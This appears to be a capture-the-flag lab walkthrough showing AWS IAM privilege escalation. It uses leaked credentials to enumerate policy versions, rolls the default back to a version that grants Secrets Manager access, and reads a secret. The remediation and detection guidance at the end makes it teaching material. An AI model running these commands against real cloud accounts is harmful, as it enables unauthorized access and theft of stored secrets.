# Walkthrough

## Step 1: AWS CLI Configuration

Configure AWS CLI with the leaked credentials.

```bash
# Get credentials from Terraform output
cd terraform
terraform output -json leaked_credentials
```

Configure a profile with the credentials:

```bash
aws configure --profile victim
# AWS Access Key ID: <from output>
# AWS Secret Access Key: <from output>
# Default region name: us-east-1
# Default output format: json
```

## Step 2: Identity Verification

Verify who you are with the compromised credentials.

```bash
aws sts get-caller-identity --profile victim
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/gnawlab/gnawlab-rollback-user-xxxxxxxx"
}
```

Note the username `gnawlab-rollback-user-xxxxxxxx` from the ARN.

---

## Step 3: IAM Permission Enumeration

Systematically enumerate all permissions available to this user.

### 3.1 List User Inline Policies

```bash
aws iam list-user-policies \
  --user-name gnawlab-rollback-user-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "PolicyNames": []
}
```

No inline policies attached.

### 3.2 List Attached Managed Policies

```bash
aws iam list-attached-user-policies \
  --user-name gnawlab-rollback-user-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "gnawlab-rollback-policy-xxxxxxxx",
            "PolicyArn": "arn:aws:iam::123456789012:policy/gnawlab/gnawlab-rollback-policy-xxxxxxxx"
        }
    ]
}
```

**Customer Managed Policy discovered!** Note the Policy ARN.

### 3.3 Check Group Membership

```bash
aws iam list-groups-for-user \
  --user-name gnawlab-rollback-user-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "Groups": []
}
```

No group membership, so group policy enumeration is not needed.

> **Note**: If groups existed, you would use `list-group-policies`, `list-attached-group-policies`, and `get-group-policy` to enumerate group permissions as well.

---

## Step 4: Policy Version Enumeration

AWS IAM policies can have up to 5 versions. Let's check if there are multiple versions.

### 4.1 List Policy Versions

```bash
POLICY_ARN="arn:aws:iam::123456789012:policy/gnawlab/gnawlab-rollback-policy-xxxxxxxx"

aws iam list-policy-versions \
  --policy-arn $POLICY_ARN \
  --profile victim
```

Expected output:
```json
{
    "Versions": [
        {
            "VersionId": "v3",
            "IsDefaultVersion": false,
            "CreateDate": "2026-05-03T12:00:02+00:00"
        },
        {
            "VersionId": "v2",
            "IsDefaultVersion": false,
            "CreateDate": "2026-05-03T12:00:01+00:00"
        },
        {
            "VersionId": "v1",
            "IsDefaultVersion": true,
            "CreateDate": "2026-05-03T12:00:00+00:00"
        }
    ]
}
```

**Multiple versions exist!** v1 is the current default, but v2 and v3 are available.

### 4.2 Get Current Policy Version (v1)

```bash
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v1 \
  --profile victim
```

Expected output:
```json
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "IdentityVerification",
                    "Effect": "Allow",
                    "Action": ["sts:GetCallerIdentity"],
                    "Resource": "*"
                },
                {
                    "Sid": "IAMEnumeration",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetUser",
                        "iam:ListUserPolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetUserPolicy",
                        "iam:ListGroupsForUser"
                    ],
                    "Resource": "arn:aws:iam::123456789012:user/gnawlab/gnawlab-rollback-user-xxxxxxxx"
                },
                {
                    "Sid": "PolicyVersionEnumeration",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicy",
                        "iam:ListPolicyVersions",
                        "iam:GetPolicyVersion"
                    ],
                    "Resource": "arn:aws:iam::123456789012:policy/gnawlab/gnawlab-rollback-policy-xxxxxxxx"
                },
                {
                    "Sid": "PolicyVersionRollback",
                    "Effect": "Allow",
                    "Action": ["iam:SetDefaultPolicyVersion"],
                    "Resource": "arn:aws:iam::123456789012:policy/gnawlab/gnawlab-rollback-policy-xxxxxxxx"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true
    }
}
```

**Current permissions (v1):**
- Identity verification
- IAM enumeration
- Policy version enumeration
- **SetDefaultPolicyVersion** (key permission!)

No Secrets Manager access in v1.

### 4.3 Get Policy Version v2

```bash
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v2 \
  --profile victim
```

v2 adds `secretsmanager:ListSecrets` - can list secrets but not read them.

### 4.4 Get Policy Version v3

```bash
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v3 \
  --profile victim
```

Expected output (relevant part):
```json
{
    "Sid": "SecretsManagerFullAccess",
    "Effect": "Allow",
    "Action": [
        "secretsmanager:ListSecrets",
        "secretsmanager:GetSecretValue",
        "secretsmanager:DescribeSecret"
    ],
    "Resource": "*"
}
```

**v3 has full Secrets Manager access!** This was the elevated permission granted during incident response.

---

## Step 5: Privilege Escalation

Roll back to policy version v3 to gain Secrets Manager access.

```bash
aws iam set-default-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v3 \
  --profile victim
```

No output means success. Verify the change:

```bash
aws iam list-policy-versions \
  --policy-arn $POLICY_ARN \
  --profile victim
```

v3 should now show `"IsDefaultVersion": true`.

---

## Step 6: Secrets Manager Enumeration

Now with elevated permissions, enumerate Secrets Manager.

```bash
aws secretsmanager list-secrets --profile victim
```

Expected output:
```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:123456789012:secret:gnawlab-rollback-secret-xxxxxxxx-XXXXXX",
            "Name": "gnawlab-rollback-secret-xxxxxxxx",
            "Description": "Production database credentials - Beaver Dam Industries"
        }
    ]
}
```

Found the secret!

---

## Step 7: Flag Extraction

Extract the secret value.

```bash
aws secretsmanager get-secret-value \
  --secret-id gnawlab-rollback-secret-xxxxxxxx \
  --profile victim
```

Expected output:
```json
{
    "SecretString": "{\"flag\":\"FLAG{iam_policy_version_rollback_to_secrets}\"}"
}
```

Extract just the flag:

```bash
aws secretsmanager get-secret-value \
  --secret-id gnawlab-rollback-secret-xxxxxxxx \
  --query 'SecretString' \
  --output text \
  --profile victim | jq -r '.flag'
```

Output:
```
FLAG{iam_policy_version_rollback_to_secrets}
```

---

## Attack Chain Summary

```
1. Leaked Credentials (GitHub repository)
   ↓ Configure AWS CLI profile
2. sts:GetCallerIdentity
   ↓ Confirm identity, extract username
3. iam:ListUserPolicies
   ↓ No inline policies
4. iam:ListAttachedUserPolicies
   ↓ Discover Customer Managed Policy
5. iam:ListGroupsForUser
   ↓ No group membership
6. iam:ListPolicyVersions
   ↓ Discover v1, v2, v3 exist
7. iam:GetPolicyVersion (v1, v2, v3)
   ↓ Compare permissions - v3 has secretsmanager:GetSecretValue
8. iam:SetDefaultPolicyVersion → v3
   ↓ Privilege escalation!
9. secretsmanager:ListSecrets
   ↓ Discover target secret
10. secretsmanager:GetSecretValue
    ↓
11. FLAG{iam_policy_version_rollback_to_secrets}
```

---

## Key Techniques

### Policy Version Enumeration

```bash
# List all versions
aws iam list-policy-versions --policy-arn <ARN>

# Get specific version details
aws iam get-policy-version --policy-arn <ARN> --version-id v1

# Change default version (privilege escalation)
aws iam set-default-policy-version --policy-arn <ARN> --version-id v3
```

### Why This Works

AWS IAM allows up to 5 versions of a managed policy. When permissions are modified:
1. A new version is created
2. Old versions remain accessible
3. Anyone with `iam:SetDefaultPolicyVersion` can switch to ANY existing version

This is dangerous when:
- Old versions have elevated permissions
- The `SetDefaultPolicyVersion` permission is not removed after restriction

---

## Lessons Learned

### 1. Policy Version Hygiene
- Delete old policy versions after restricting permissions
- Never leave elevated permission versions accessible
- Audit policy versions regularly

### 2. Least Privilege for IAM Permissions
- `iam:SetDefaultPolicyVersion` is a dangerous permission
- Should only be granted to administrators
- Consider using Service Control Policies (SCPs) to restrict

### 3. Detection and Monitoring
- Monitor CloudTrail for `SetDefaultPolicyVersion` API calls
- Alert on policy version changes
- Use AWS Config rules to detect policy drift

---

## Remediation

### Delete Old Policy Versions

```bash
# List versions
aws iam list-policy-versions --policy-arn <ARN>

# Delete non-default versions
aws iam delete-policy-version --policy-arn <ARN> --version-id v2
aws iam delete-policy-version --policy-arn <ARN> --version-id v3
```

### Restrict SetDefaultPolicyVersion

Use an SCP to prevent non-admin users from changing policy versions:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenySetDefaultPolicyVersion",
      "Effect": "Deny",
      "Action": "iam:SetDefaultPolicyVersion",
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/Admin*"
        }
      }
    }
  ]
}
```

### CloudTrail Monitoring

Set up CloudWatch alarms for `SetDefaultPolicyVersion` events:

```json
{
  "source": ["aws.iam"],
  "detail-type": ["AWS API Call via CloudTrail"],
  "detail": {
    "eventName": ["SetDefaultPolicyVersion"]
  }
}
```
